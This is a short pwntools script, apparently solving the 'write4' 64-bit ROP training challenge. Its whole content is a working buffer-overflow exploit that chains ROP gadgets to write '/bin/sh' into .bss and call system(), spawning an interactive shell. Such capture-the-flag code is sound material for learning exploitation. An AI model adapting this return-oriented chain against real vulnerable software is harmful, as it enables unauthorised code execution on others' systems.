from pwn import *


elf = ELF('./write4-64')

context.terminal=['tmux','sp','-h']
#context.log_level='DEBUG'

bss_pointer=0x601068 #0000000000601060 l    d  .bs

io=process(elf.path)
payload= flat(
        'A'*40 ,
        0x400890, #0x0000000000400890: pop r14; pop r15; ret; 
        bss_pointer,
        '/bin/sh\x00', #string to write
        0x400818, #0x0000000000400818: nop dword ptr [rax + rax]; mov qword ptr [r14], r15; ret; 
        0x400893, #0x0000000000400893: pop rdi; ret;
        bss_pointer,
        elf.sym['system'],
        endianness='little',word_size=64,sign=False)

io.recvuntil('> ')
io.sendline(payload)
io.interactive()
